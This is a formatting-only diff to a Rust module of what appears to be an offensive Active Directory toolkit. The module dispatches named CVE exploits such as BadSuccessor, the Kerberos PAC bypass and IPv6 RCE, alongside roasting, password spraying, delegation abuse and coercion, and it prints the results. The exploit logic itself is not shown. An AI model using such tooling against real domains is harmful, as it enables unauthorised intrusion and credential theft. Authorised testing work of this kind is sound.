@@ -3,16 +3,12 @@
 
 use crate::asreproast::{AsRepRoastConfig, AsRepRoastResult};
 use crate::attacks::{
-    AdDsEopResult, CbaBypassResult, ChecksumBypassConfig, Ipv6RceConfig,
-    KrbBypassConfig, NetCfgOpsResult, SssdLinuxConfig,
-    WacCompromiseConfig, assess_cba_bypass,
-    compromise_wac, exploit_ad_ds_eop, exploit_all_checksum_techniques,
-    exploit_ipv6_rce, exploit_krb_pac_bypass, exploit_netcfg_ops,
-    exploit_sssd_linux,
+    AdDsEopResult, CbaBypassResult, ChecksumBypassConfig, Ipv6RceConfig, KrbBypassConfig,
+    NetCfgOpsResult, SssdLinuxConfig, WacCompromiseConfig, assess_cba_bypass, compromise_wac,
+    exploit_ad_ds_eop, exploit_all_checksum_techniques, exploit_ipv6_rce, exploit_krb_pac_bypass,
+    exploit_netcfg_ops, exploit_sssd_linux,
 };
-use crate::bad_successor::{
-    BadSuccessorResult, exploit_bad_successor,
-};
+use crate::bad_successor::{BadSuccessorResult, exploit_bad_successor};
 use crate::coerce::{CoerceConfig, CoerceResult};
 use crate::constrained::{ConstrainedConfig, ConstrainedResult};
 use crate::kerberoast::{KerberoastConfig, KerberoastResult};
@@ -88,7 +84,10 @@ impl HuntConfig {
 #[derive(Debug, Clone)]
 pub enum CveAttackType {
     /// CVE-2025-53779: BadSuccessor dMSA privilege escalation
-    BadSuccessor { target_da_dn: String, auto_cleanup: bool },
+    BadSuccessor {
+        target_da_dn: String,
+        auto_cleanup: bool,
+    },
     /// CVE-2025-21293: Network Configuration Operators EoP
     NetCfgOps { dll_path: Option<String> },
     /// CVE-2025-21299: Kerberos PAC signature bypass
@@ -106,7 +105,10 @@ pub enum CveAttackType {
     /// CVE-2024-38063: IPv6 fragment RCE
     Ipv6Rce(Ipv6RceConfig),
     /// CVE-2024-21410: Exchange NTLM relay
-    ExchangeRelay { target_exchange: String, relay_port: u16 },
+    ExchangeRelay {
+        target_exchange: String,
+        relay_port: u16,
+    },
 }
 
 impl CveAttackType {
@@ -293,7 +295,11 @@ impl HuntReport {
         if let Some(ref r) = self.asreproast {
             println!(
                 "  {} AS-REP Roast: {} hashes from {} targets",
-                if r.hashes.is_empty() { "✗".red() } else { "✓".green() },
+                if r.hashes.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.hashes.len().to_string().bold(),
                 r.users_checked,
             );
@@ -301,7 +307,11 @@ impl HuntReport {
         if let Some(ref r) = self.kerberoast {
             println!(
                 "  {} Kerberoast:   {} hashes from {} SPNs",
-                if r.hashes.is_empty() { "✗".red() } else { "✓".green() },
+                if r.hashes.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.hashes.len().to_string().bold(),
                 r.spns_checked,
             );
@@ -309,7 +319,11 @@ impl HuntReport {
         if let Some(ref r) = self.spray {
             println!(
                 "  {} Spray:        {} valid creds, {} lockouts, {} attempts",
-                if r.valid_creds.is_empty() { "✗".red() } else { "✓".green() },
+                if r.valid_creds.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.valid_creds.len().to_string().bold(),
                 r.locked_out.len(),
                 r.attempts,
@@ -318,28 +332,48 @@ impl HuntReport {
         if let Some(ref r) = self.constrained {
             println!(
                 "  {} Constrained:  {} delegatable accounts",
-                if r.delegatable_accounts.is_empty() { "✗".red() } else { "✓".green() },
+                if r.delegatable_accounts.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.delegatable_accounts.len().to_string().bold(),
             );
         }
         if let Some(ref r) = self.unconstrained {
             println!(
                 "  {} Unconstrained: {} vulnerable hosts",
-                if r.vulnerable_hosts.is_empty() { "✗".red() } else { "✓".green() },
+                if r.vulnerable_hosts.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.vulnerable_hosts.len().to_string().bold(),
             );
         }
         if let Some(ref r) = self.rbcd {
             println!(
                 "  {} RBCD: {}",
-                if r.success { "✓".green() } else { "✗".red() },
-                if r.success { "delegation configured" } else { "not performed" },
+                if r.success {
+                    "✓".green()
+                } else {
+                    "✗".red()
+                },
+                if r.success {
+                    "delegation configured"
+                } else {
+                    "not performed"
+                },
             );
         }
         if let Some(ref r) = self.coerce {
             println!(
                 "  {} Coerce: {}/{} methods succeeded",
-                if r.successful_coercions.is_empty() { "✗".red() } else { "✓".green() },
+                if r.successful_coercions.is_empty() {
+                    "✗".red()
+                } else {
+                    "✓".green()
+                },
                 r.successful_coercions.len(),
                 r.methods_attempted,
             );
@@ -347,7 +381,11 @@ impl HuntReport {
 
         // CVE attack results
         for r in &self.cve_results {
-            let icon = if r.success { "✓".green() } else { "✗".red() };
+            let icon = if r.success {
+                "✓".green()
+            } else {
+                "✗".red()
+            };
             println!("  {} {} ({}): {}", icon, r.cve_id, r.name, r.summary);
         }
 
@@ -384,10 +422,7 @@ impl HuntReport {
 // CVE Attack Dispatcher
 // ═══════════════════════════════════════════════════════════
 
-async fn dispatch_cve_attack(
-    config: &HuntConfig,
-    attack: &CveAttackType,
-) -> CveAttackResult {
+async fn dispatch_cve_attack(config: &HuntConfig, attack: &CveAttackType) -> CveAttackResult {
     let cve_id = attack.cve_id();
     let name = attack.name();
     let log = |msg: String| format!("[{}] {}", name, msg);
@@ -395,31 +430,35 @@ async fn dispatch_cve_attack(
     info!("Running CVE attack: {} ({})", name, cve_id);
 
     match attack {
-        CveAttackType::BadSuccessor { target_da_dn, auto_cleanup } => {
-            match run_cve_bad_successor(config, target_da_dn, *auto_cleanup).await {
-                Ok(result) => CveAttackResult {
-                    cve_id: cve_id.to_string(),
-                    name: name.to_string(),
-                    success: true,
-                    summary: format!("TGT obtained for {}", target_da_dn),
-                    log: result.log,
-                },
-                Err(e) => CveAttackResult {
-                    cve_id: cve_id.to_string(),
-                    name: name.to_string(),
-                    success: false,
-                    summary: format!("Failed: {e}"),
-                    log: vec![log(format!("Error: {e}"))],
-                },
-            }
-        }
+        CveAttackType::BadSuccessor {
+            target_da_dn,
+            auto_cleanup,
+        } => match run_cve_bad_successor(config, target_da_dn, *auto_cleanup).await {
+            Ok(result) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: true,
+                summary: format!("TGT obtained for {}", target_da_dn),
+                log: result.log,
+            },
+            Err(e) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: false,
+                summary: format!("Failed: {e}"),
+                log: vec![log(format!("Error: {e}"))],
+            },
+        },
         CveAttackType::NetCfgOps { dll_path } => {
             match run_cve_netcfgops(config, dll_path.as_deref()).await {
                 Ok(result) => CveAttackResult {
                     cve_id: cve_id.to_string(),
                     name: name.to_string(),
                     success: result.exploit_success,
-                    summary: format!("Member: {}, members: {}", result.is_member, result.member_count),
+                    summary: format!(
+                        "Member: {}, members: {}",
+                        result.is_member, result.member_count
+                    ),
                     log: result.log,
                 },
                 Err(e) => CveAttackResult {
@@ -447,24 +486,22 @@ async fn dispatch_cve_attack(
                 log: vec![log(format!("Error: {e}"))],
             },
         },
-        CveAttackType::CbaBypass => {
-            match run_cve_cba_bypass(config).await {
-                Ok(result) => CveAttackResult {
-                    cve_id: cve_id.to_string(),
-                    name: name.to_string(),
-                    success: result.has_exploitable_template,
-                    summary: format!("CAs outside NTAuth: {}", result.non_nt_auth_cas.len()),
-                    log: result.log,
-                },
-                Err(e) => CveAttackResult {
-                    cve_id: cve_id.to_string(),
-                    name: name.to_string(),
-                    success: false,
-                    summary: format!("Failed: {e}"),
-                    log: vec![log(format!("Error: {e}"))],
-                },
-            }
-        }
+        CveAttackType::CbaBypass => match run_cve_cba_bypass(config).await {
+            Ok(result) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: result.has_exploitable_template,
+                summary: format!("CAs outside NTAuth: {}", result.non_nt_auth_cas.len()),
+                log: result.log,
+            },
+            Err(e) => CveAttackResult {
+                cve_id: cve_id.to_string(),
+                name: name.to_string(),
+                success: false,
+                summary: format!("Failed: {e}"),
+                log: vec![log(format!("Error: {e}"))],
+            },
+        },
         CveAttackType::ChecksumBypass(cc) => {
             let results = exploit_all_checksum_techniques(cc).await;
             let succeeded = results.iter().filter(|r| r.success).count();
@@ -498,7 +535,10 @@ async fn dispatch_cve_attack(
                 cve_id: cve_id.to_string(),
                 name: name.to_string(),
                 success: result.vulnerable,
-                summary: format!("Build version: {:?}, vulnerable: {}", result.dc_build_version, result.vulnerable),
+                summary: format!(
+                    "Build version: {:?}, vulnerable: {}",
+                    result.dc_build_version, result.vulnerable
+                ),
                 log: result.log,
             },
             Err(e) => CveAttackResult {
@@ -514,7 +554,11 @@ async fn dispatch_cve_attack(
                 cve_id: cve_id.to_string(),
                 name: name.to_string(),
                 success: result.access_obtained,
-                summary: format!("Servers: {}, auth: {:?}", result.managed_servers.len(), result.auth_methods),
+                summary: format!(
+                    "Servers: {}, auth: {:?}",
+                    result.managed_servers.len(),
+                    result.auth_methods
+                ),
                 log: result.log,
             },
             Err(e) => CveAttackResult {
@@ -541,15 +585,20 @@ async fn dispatch_cve_attack(
                 log: vec![log(format!("Error: {e}"))],
             },
         },
-        CveAttackType::ExchangeRelay { target_exchange, relay_port } => {
-            CveAttackResult {
-                cve_id: cve_id.to_string(),
-                name: name.to_string(),
-                success: false,
-                summary: format!("Stub — use overthrone-relay standalone (Exchange: {target_exchange}:{relay_port})"),
-                log: vec![log("Exchange relay requires the standalone relay crate".into())],
-            }
-        }
+        CveAttackType::ExchangeRelay {
+            target_exchange,
+            relay_port,
+        } => CveAttackResult {
+            cve_id: cve_id.to_string(),
+            name: name.to_string(),
+            success: false,
+            summary: format!(
+                "Stub — use overthrone-relay standalone (Exchange: {target_exchange}:{relay_port})"
+            ),
+            log: vec![log(
+                "Exchange relay requires the standalone relay crate".into()
+            )],
+        },
     }
 }
 
@@ -563,14 +612,22 @@ async fn connect_ldap(config: &HuntConfig) -> Result<overthrone_core::proto::lda
 
     if config.use_hash {
         LdapSession::connect_with_hash(
-            &config.dc_ip, &config.domain, &config.username,
-            &config.secret, config.use_ldaps,
-        ).await
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await
     } else {
         LdapSession::connect(
-            &config.dc_ip, &config.domain, &config.username,
-            &config.secret, config.use_ldaps,
-        ).await
+            &config.dc_ip,
+            &config.domain,
+            &config.username,
+            &config.secret,
+            config.use_ldaps,
+        )
+        .await
     }
 }
 
@@ -580,13 +637,17 @@ async fn run_cve_bad_successor(
     auto_cleanup: bool,
 ) -> Result<BadSuccessorResult> {
     let mut ldap = connect_ldap(config).await?;
-    exploit_bad_successor(&mut ldap, &config.dc_ip, &config.domain, target_da_dn, auto_cleanup).await
+    exploit_bad_successor(
+        &mut ldap,
+        &config.dc_ip,
+        &config.domain,
+        target_da_dn,
+        auto_cleanup,
+    )
+    .await
 }
 
-async fn run_cve_netcfgops(
-    config: &HuntConfig,
-    dll_path: Option<&str>,
-) -> Result<NetCfgOpsResult> {
+async fn run_cve_netcfgops(config: &HuntConfig, dll_path: Option<&str>) -> Result<NetCfgOpsResult> {
     let mut ldap = connect_ldap(config).await?;
 
     // Attempt SMB connection for remote registry write
@@ -600,12 +661,20 @@ async fn run_cve_netcfgops(
     if let Some(host) = &target_host {
         let smb_result = if config.use_hash {
             overthrone_core::proto::smb::SmbSession::connect_with_hash(
-                host, &config.domain, &config.username, &config.secret,
-            ).await
+                host,
+                &config.domain,
+                &config.username,
+                &config.secret,
+            )
+            .await
         } else {
             overthrone_core::proto::smb::SmbSession::connect(
-                host, &config.domain, &config.username, &config.secret,
-            ).await
+                host,
+                &config.domain,
+                &config.username,
+                &config.secret,
+            )
+            .await
         };
         match smb_result {
             Ok(s) => {
@@ -619,12 +688,8 @@ async fn run_cve_netcfgops(
         }
     }
 
-    let result = exploit_netcfg_ops(
-        &mut ldap,
-        dll_path,
-        smb.as_mut(),
-        target_host.as_deref(),
-    ).await?;
+    let result =
+        exploit_netcfg_ops(&mut ldap, dll_path, smb.as_mut(), target_host.as_deref()).await?;
     Ok(result)
 }
 
@@ -725,7 +790,10 @@ pub async fn run_hunt(config: &HuntConfig, actions: &[HuntAction]) -> Result<Hun
                 if result.success {
                     info!("CVE attack succeeded: {} ({})", result.name, result.cve_id);
                 } else {
-                    warn!("CVE attack failed: {} ({}) — {}", result.name, result.cve_id, result.summary);
+                    warn!(
+                        "CVE attack failed: {} ({}) — {}",
+                        result.name, result.cve_id, result.summary
+                    );
                 }
                 report.cve_results.push(result);
             }
